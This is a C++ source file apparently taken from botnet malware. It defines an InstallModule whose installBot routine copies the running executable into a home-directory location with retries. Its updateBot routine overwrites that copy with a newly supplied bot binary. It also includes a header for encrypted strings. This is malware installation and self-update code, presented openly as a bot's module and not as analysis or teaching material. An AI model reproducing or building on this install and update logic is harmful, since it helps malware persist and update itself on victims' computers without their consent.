#include "stdafx.h"
#include "kernel.h"
#include "installmodule.h"
#include "filesystem.h"
#include "cryptedstrings.h"

void InstallModule::init()
{

}

void InstallModule::uninit()
{

}

static bool saveFileWithRetry(LPWSTR path, BYTE * data, DWORD dataSize, int maxRetry)
{
	for (int loop = 0;; loop++)
	{
		if (FileSystem::saveDataToFile(path, data, dataSize))
		{
			return true;
		}
		else
		{
			WDEBUG0(WDDT_ERROR, "Failed to save file : " << path);
			if (maxRetry >= 0 && maxRetry <= loop)break;
		}
		Sleep(5000 + loop);
	}
	return false;
}

static bool saveCoreFile(const LPWSTR filePath, int maxRetry)
{
	FileSystem::memory_file_t memoryFile;
	if (FileSystem::fileToMemory(kernelData.paths.process, &memoryFile))
	{
		bool result = saveFileWithRetry(filePath, memoryFile.data, memoryFile.size, maxRetry);
		FileSystem::closeMemoryFile(&memoryFile);
		return result;
	}
	return false;
}

bool InstallModule::installBot(LPWSTR coreFile)
{
	WCHAR path[MAX_PATH];
	WCHAR directory[MAX_PATH];
	
	if (!FileSystem::combinePath(path, kernelData.paths.home, coreFile)) return false;

	wcscpy_s(directory, path);

	PathRemoveFileSpec(directory);

	if (GetFileAttributes(directory) == INVALID_FILE_ATTRIBUTES)
	{
		if (!FileSystem::createDirectoryTree(directory, NULL)) return false;
	}

	HANDLE file = CreateFile(path, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (file != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file);
		return saveCoreFile(path, 10);
	}

	return false;
}

bool InstallModule::updateBot(LPWSTR coreFile, BYTE * newBot, DWORD newBotSize)
{
	WCHAR path[MAX_PATH];
	WCHAR directory[MAX_PATH];

	if (!FileSystem::combinePath(path, kernelData.paths.home, coreFile)) return false;

	wcscpy_s(directory, path);

	PathRemoveFileSpec(directory);

	if (GetFileAttributes(directory) == INVALID_FILE_ATTRIBUTES)
	{
		if (!FileSystem::createDirectoryTree(directory, NULL)) return false;
	}

	HANDLE file = CreateFile(path, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (file != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file);
		if (saveFileWithRetry(path, newBot, newBotSize, 10))
		{
			return true;
		}
	}

	return false;
}